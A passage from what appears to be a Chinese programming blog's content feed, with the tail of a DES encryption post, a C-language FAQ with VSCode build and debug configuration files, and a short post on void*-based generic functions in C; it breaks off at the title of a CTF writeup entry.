class="number">22</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">25</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="反函数置换fp">反函数置换FP</h2><p>FP和IP为反函数关系,轮函数后再进行一次<code>FP置换</code>得到最终结果.</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231213162039600.png" alt="image-20231213162039600" style="zoom:50%;" /><p><code>IP逆</code>即为FP.</p><br><p>至此,即为整个加密,可以发现,使用同一个子密钥对一段数据进行两次轮函数(?)处理,得到的结果不变,这就体现出DES的加解密几乎一致.</p><h1 id="des解密">DES解密</h1><p>只需要将生成的16个子密钥逆转即可,即</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reverse_keys(SubKeys,<span class="number">16</span>); <span class="comment">// 自定义的函数,将16个子密钥反序</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 加密算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言教程-1_0-常见问题汇总</title>
      <link href="/2023-12-12-52962f72321d/"/>
      <url>/2023-12-12-52962f72321d/</url>
      
        <content type="html"><![CDATA[<p>ps:如果各位有遇到什么经典问题,欢迎在下面评论区@我,我会进行补充,谢谢~</p><h1 id="常识篇">常识篇</h1><p>指的是编程应该有的常识~</p><h2 id="字符分类">字符分类</h2><h3 id="字符">字符</h3><p>在计算机和电信技术中,一个字符是一个单位的字形、类字形单位或符号的基本信息.</p><p>一个字符可以是一个中文汉字、一个英文字母、一个阿拉伯数字、一个标点符号、一个图形符号或者控制符号等.</p><h3 id="字符集">字符集</h3><p>不同的字符集包含的字符个数不一样、包含的字符不一样、对字符的编码方式也不一样.</p><p>常见的字符集有:</p><ul><li><code>GB2312</code>:中国国家标准的简体中文字符集.</li><li>ASCII:只包含了128个字符,主要为英文字符,阿拉伯数字和一些简单的控制字符.</li><li>GBK字符集.在<code>GB2312</code>的基础上添加了部分字符,就形成了<code>GBK</code>,完全兼容<code>GB2312</code>.</li><li>Unicode字符集.国际标准字符集,可以容纳一百多万个字符.</li></ul><h3 id="ascii字符集">ASCII字符集</h3><p>C语言代码仅使用ASCII字符集构成(不考虑字符串).</p><p>分成<code>可见字符</code>和<code>不可见字符</code>,即一些控制字符和正常的英文字母,数字标点等可见字符.</p><p>其中<code>空格' '</code>,<code>制表符'\t'</code>,<code>换行符'\n'</code>,<code>回车符'\n'</code>,虽然为可见字符,但是是空白字符.</p><p>scanf()函数的<code>%s</code>格式控制符在遇到空白字符时会停止.</p><h1 id="软件篇">软件篇</h1><h2 id="概念的分辨">概念的分辨</h2><p>IDE,编译器,编辑器他们不是一个东西……</p><p><code>IDE</code>:即集成开发环境(Integrated Development Environment),是一个集成的软件,不仅仅可以进行代码的<code>编辑</code>,一般还默认集成了某种(或多种)<code>编译器</code>进行代码编译,还包括了<code>调试</code>功能,甚至还会有代码仓库的管理,协同开发等高级功能,一般较为庞大,不过也有<code>DevC++</code>这样的小型IDE.</p><p>常见的IDE有<code>Visual Studio(VS)</code>,<code>CLion</code>,<code>Devc++</code>,<code>Xcode</code>等等.他们有的是免费软件,但更多的是收费软件,具体见官方网址.</p><p><code>编译器</code>:即编程语言的编译工具,用于将源代码转为可执行代码,编译器几乎都是方便易用的,而且几乎都是免费的,下载即用.C/C++常用编译器仅有3种:<code>GCC(Linux下,windows移植于Mingw工具链)</code>,<code>Clang/LLVM</code>,<code>MSVC(微软家的编译器,VS系列IDE默认的编译器)</code>.</p><p><code>编辑器</code>:就跟windows下的记事本一样的…敲代码用的,只不过像<code>VScode</code>,<code>Sublimetext3</code>,<code>Notepad++</code>这样的高级编辑器十分强大,内置了许多高级的编辑功能,而且往往可以通过安装扩展来支持各种其他功能,往往能直接配置编译器进行代码的编译运行,所以甚至可以被改造为一款<code>IDE</code>.</p><h2 id="ide使用">IDE使用</h2><h3 id="vs配置c-c-环境并创建项目">VS配置C/C++环境并创建项目</h3><ol><li><p>2023年了,就别用VS2019,VS2022之前的版本了…</p></li><li><p>安装的时候只在<code>工作负荷</code>选一个<code>使用C++的桌面开发</code>,其他的什么都不动!</p></li></ol><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231218000958855.png" alt="image-20231218000958855" style="zoom:33%;" /><ol start="3"><li>创建项目注意一定是C++的,天天都有人问为什么不能跑代码,一看创建的是C#项目…</li></ol><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231218000442912.png" alt="image-20231218000442912" style="zoom: 33%;" /><ol start="4"><li>配置项目名和路径,最好找一个目录,专门存每次的代码,例如<code>D:\code\My_VS_Code\</code></li></ol><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231218000630109.png" alt="image-20231218000630109" style="zoom:33%;" /><ol start="5"><li>VS编写C代码不能使用scanf等函数,解决方法见:</li></ol><p>​<a href="https://gngtwhh.github.io/2023-09-19-bb3b8099b657/">C语言教程-2-环境搭建</a></p><ol start="6"><li>一个项目只对应一个程序,一个程序只能有一个main()入口,哪怕你在一个项目里开了一堆源文件,也只能保留一个main(),因为这些源文件属于一个程序,不理解请移步<code>谷歌</code>搜索<code>C语言多文件编程</code></li><li>待补充</li></ol><h2 id="编译器使用">编译器使用</h2><h3 id="gcc-g-编译">gcc/g++编译</h3><h2 id="高级文本编辑器配置">高级文本编辑器配置</h2><h3 id="vscode配置c-c-的基本编译-运行调试环境">VSCode配置C/C++的基本编译/运行调试环境</h3><p>首先,刚接触C的新手建议离开,一定程度上熟悉了编程的萌新可以逝逝.</p><p>VScode的项目设置由目录下的<code>.vscode</code>中的json配置文件控制,我们需要配置3个文件:</p><p><code>c_cpp_properties.json</code>,<code>tasks.json</code>,<code>launch.json</code></p><p><code>c_cpp_properties.json</code>为C/C++语言相关的一些配置参数;</p><p><code>tasks.json</code>为任务配置文件,其中的每一个子项就是一个任务,我们可以将各种编译任务在这里配置.</p><p><code>launch.json</code>为启动配置文件,用于启动编译后的程序,进行运行或调试;</p><h4 id="c-cpp-properties-json">c_cpp_properties.json</h4><p>使用这个配置文件对C/C++源文件进行编译选项和环境的配置.</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;configurations&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Win32&quot;</span><span class="punctuation">,</span> <span class="comment">// 表示这个配置项是为 Win32 平台准备的</span></span><br><span class="line">            <span class="attr">&quot;includePath&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span> <span class="comment">// 指定了用于查找头文件的目录</span></span><br><span class="line">                <span class="string">&quot;$&#123;workspaceFolder&#125;/**&quot;</span> <span class="comment">// 将会包含工作区文件夹下的所有子目录</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;defines&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span> <span class="comment">// 定义宏的数组，这些宏将在编译过程中生效</span></span><br><span class="line">                <span class="string">&quot;_DEBUG&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;UNICODE&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;_UNICODE&quot;</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;windowsSdkVersion&quot;</span><span class="punctuation">:</span> <span class="string">&quot;10.0.19041.0&quot;</span><span class="punctuation">,</span> <span class="comment">// 指定 Windows SDK 版本的配置项</span></span><br><span class="line">            <span class="attr">&quot;compilerPath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;path&gt;/mingw64/bin/g++.exe&quot;</span><span class="punctuation">,</span> <span class="comment">// 指定编译器路径的配置项,指定了g++编译器的完整路径,这里的&lt;path&gt;是你的mingw安装路径</span></span><br><span class="line">            <span class="attr">&quot;cStandard&quot;</span><span class="punctuation">:</span> <span class="string">&quot;c17&quot;</span><span class="punctuation">,</span> <span class="comment">// 指定C17标准</span></span><br><span class="line">            <span class="attr">&quot;cppStandard&quot;</span><span class="punctuation">:</span> <span class="string">&quot;c++17&quot;</span><span class="punctuation">,</span> <span class="comment">// 指定C++17标准</span></span><br><span class="line">            <span class="attr">&quot;intelliSenseMode&quot;</span><span class="punctuation">:</span> <span class="string">&quot;windows-gcc-x64&quot;</span> <span class="comment">// 使用 Windows 平台上的 GCC 编译器进行 IntelliSense 代码补全和语法检查</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="number">4</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h4 id="tasks-json">tasks.json</h4><p>这个文件配置了各种任务,我们进行编译操作的配置.</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2.0.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;tasks&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span> <span class="comment">// 该列表的每一项都是一个任务</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cppbuild&quot;</span><span class="punctuation">,</span> <span class="comment">// 类型</span></span><br><span class="line">            <span class="attr">&quot;label&quot;</span><span class="punctuation">:</span> <span class="string">&quot;C++ Build&quot;</span><span class="punctuation">,</span> <span class="comment">// 重要,任务名</span></span><br><span class="line">            <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;path&gt;/mingw64/bin/g++.exe&quot;</span><span class="punctuation">,</span> <span class="comment">// 调用g++对C++进行编译</span></span><br><span class="line">            <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span> <span class="comment">// 命令行参数</span></span><br><span class="line">                <span class="string">&quot;-fdiagnostics-color=always&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;-g&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;$&#123;file&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;-std=c++11&quot;</span><span class="punctuation">,</span> <span class="comment">// C++11标准</span></span><br><span class="line">                <span class="string">&quot;-o&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;$&#123;fileDirname&#125;/$&#123;fileBasenameNoExtension&#125;.exe&quot;</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;options&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;cwd&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;path&gt;/mingw64/bin&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;problemMatcher&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;$gcc&quot;</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;group&quot;</span><span class="punctuation">:</span> <span class="string">&quot;build&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;detail&quot;</span><span class="punctuation">:</span> <span class="string">&quot;使用 g++ 进行c++单个文件的编译&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cppbuild&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;label&quot;</span><span class="punctuation">:</span> <span class="string">&quot;C Build&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;path&gt;/mingw64/bin/gcc.exe&quot;</span><span class="punctuation">,</span> <span class="comment">// 调用gcc对C进行编译</span></span><br><span class="line">            <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;-fdiagnostics-color=always&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;-g&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;$&#123;file&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;-std=c11&quot;</span><span class="punctuation">,</span> <span class="comment">// C11标准</span></span><br><span class="line">                <span class="string">&quot;-o&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;$&#123;fileDirname&#125;/$&#123;fileBasenameNoExtension&#125;.exe&quot;</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;options&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;cwd&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;path&gt;/mingw64/bin&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;problemMatcher&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;$gcc&quot;</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;group&quot;</span><span class="punctuation">:</span> <span class="string">&quot;build&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;detail&quot;</span><span class="punctuation">:</span> <span class="string">&quot;使用 gcc 进行c语言单个文件的编译&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cppbuild&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;label&quot;</span><span class="punctuation">:</span> <span class="string">&quot;c/c++ debug&quot;</span><span class="punctuation">,</span> <span class="comment">// 这个任务专门用于调试</span></span><br><span class="line">            <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;path&gt;/mingw64/bin/g++.exe&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;-fdiagnostics-color=always&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;-g&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;$&#123;file&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;-o&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;$&#123;fileDirname&#125;\\$&#123;fileBasenameNoExtension&#125;.exe&quot;</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;options&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;cwd&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;path&gt;/mingw64/bin&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;problemMatcher&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;$gcc&quot;</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;group&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;kind&quot;</span><span class="punctuation">:</span> <span class="string">&quot;build&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;isDefault&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;detail&quot;</span><span class="punctuation">:</span> <span class="string">&quot;调试器生成的任务。&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h4 id="launch-json">launch.json</h4><p>这里是启动配置,这里配置了调试的配置信息.</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0.2.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;configurations&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;C/C++ debug&quot;</span><span class="punctuation">,</span> <span class="comment">// 启动配置的名称</span></span><br><span class="line">            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cppdbg&quot;</span><span class="punctuation">,</span> <span class="comment">// C++的debug</span></span><br><span class="line">            <span class="attr">&quot;request&quot;</span><span class="punctuation">:</span> <span class="string">&quot;launch&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="comment">// inner shell</span></span><br><span class="line">            <span class="attr">&quot;program&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;fileDirname&#125;//$&#123;fileBasenameNoExtension&#125;.exe&quot;</span><span class="punctuation">,</span> <span class="comment">// 启动对应的程序</span></span><br><span class="line">            <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="comment">// 这里可以用于在外部运行</span></span><br><span class="line">            <span class="comment">// outer shell</span></span><br><span class="line">            <span class="comment">// &quot;program&quot;: &quot;C://Windows//System32//cmd.exe&quot;,</span></span><br><span class="line">            <span class="comment">// &quot;args&quot;: [</span></span><br><span class="line">            <span class="comment">//     &quot;/c&quot;,</span></span><br><span class="line">            <span class="comment">//     &quot;$&#123;fileDirname&#125;//$&#123;fileBasenameNoExtension&#125;.exe&quot;,</span></span><br><span class="line">            <span class="comment">//     &quot;&amp;&quot;,</span></span><br><span class="line">            <span class="comment">//     &quot;echo.&quot;,</span></span><br><span class="line">            <span class="comment">//     &quot;&amp;&quot;,</span></span><br><span class="line">            <span class="comment">//     &quot;pause&quot;,</span></span><br><span class="line">            <span class="comment">// ],</span></span><br><span class="line">            <span class="attr">&quot;stopAtEntry&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;cwd&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;fileDirname&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;environment&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;externalConsole&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span> <span class="comment">//设置是否启动外部控制台</span></span><br><span class="line">            <span class="comment">// &quot;avoidWindowsConsoleRedirection&quot;: true,</span></span><br><span class="line">            <span class="attr">&quot;MIMode&quot;</span><span class="punctuation">:</span> <span class="string">&quot;gdb&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;miDebuggerPath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;path&gt;/mingw64/bin/gdb.exe&quot;</span><span class="punctuation">,</span> <span class="comment">// gdb调试器的路径</span></span><br><span class="line">            <span class="attr">&quot;setupCommands&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;为 gdb 启用整齐打印&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;text&quot;</span><span class="punctuation">:</span> <span class="string">&quot;-enable-pretty-printing&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;ignoreFailures&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;将反汇编风格设置为 Intel&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;text&quot;</span><span class="punctuation">:</span> <span class="string">&quot;-gdb-set disassembly-flavor intel&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;ignoreFailures&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;preLaunchTask&quot;</span><span class="punctuation">:</span> <span class="string">&quot;c/c++ debug&quot;</span> <span class="comment">// 十分重要,在启动前需要运行的任务,该任务参见前面的task.json中的对应任务,即在启动调试前先进行编译</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>​</p><h1 id="代码篇">代码篇</h1><h2 id="输出中文乱码">输出中文乱码</h2><p>以&quot;小熊猫C++&quot;IDE为例.</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231226153023590.png" alt="image-20231226153023590" style="zoom:50%;" /><p>检查右下角是否为UTF-8编码,如果是,则需要转换为ANSI编码:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231226153513381.png" alt="image-20231226153513381" style="zoom:50%;" /><p>其他软件类似,这种问题就是<code>GBK</code>和<code>UTF-8</code>编码不兼容的问题.</p><p>Windows默认GBK编码,因此兼容性不佳(一般都是用UTF-8编码比较常见).</p><h2 id="输入输出">输入输出</h2><h2 id="字符串操作">字符串操作</h2><h2 id="栈溢出与安全问题">栈溢出与安全问题</h2><h1 id="风格篇">风格篇</h1><h2 id="代码格式化">代码格式化</h2>]]></content>
      
      
      <categories>
          
          <category> C语言教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言实现泛型编程</title>
      <link href="/2023-12-10-c325ef9ea8d5/"/>
      <url>/2023-12-10-c325ef9ea8d5/</url>
      
        <content type="html"><![CDATA[<p>很遗憾,C语言本身并不支持真正意义上的泛型编程,但是可以通过一些方法在一定程度上实现泛型编程.</p><p>例如使用<code>void *</code>进行<code>类型擦除</code>,实现一定程度上的&quot;泛型&quot;;使用<code>_Generic</code>关键字等…</p><h1 id="使用void-类型擦除来实现">使用void*类型擦除来实现</h1><h2 id="泛型实现一些算法">泛型实现一些算法</h2><h3 id="swap-函数">swap()函数</h3><p>一般的swap只能特定处理某一种类型:</p><p><code>void swap(int*a, int*b);</code></p><p>可以使用<code>void*</code>擦除类型,并用memcpy()进行数据处理:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">swap</span><span class="params">(<span class="type">void</span> *a,<span class="type">void</span> *b,<span class="type">int</span> size)</span>&#123;</span><br><span class="line">    <span class="type">char</span> buf[size]; <span class="comment">// gcc allows</span></span><br><span class="line">    <span class="built_in">memcpy</span>(buf,a,size);</span><br><span class="line">    <span class="built_in">memcpy</span>(a,b,size);</span><br><span class="line">    <span class="built_in">memcpy</span>(b,buf,size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="顺序表lsearch-函数">顺序表lsearch()函数</h3><p>同理,这次用memcmp()进行数据比较:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span>* <span class="title function_">lsearch</span><span class="params">(<span class="type">void</span>* base,<span class="type">int</span> n,<span class="type">void</span>* key,<span class="type">int</span> elemSize)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;n;++i)&#123;</span><br><span class="line">        <span class="type">void</span> *elemPtr = (<span class="type">char</span>*)base + i*elemSize;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">memcmp</span>(key,elemPtr,elemSize) == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> elemPtr;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 琐碎想法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Writeup-GeekChallenge2023</title>
      <link href="/2023-12-07-8a75fe086e87/"/>
      <url>/2023-12-07-8a75fe086e87/</url>
      
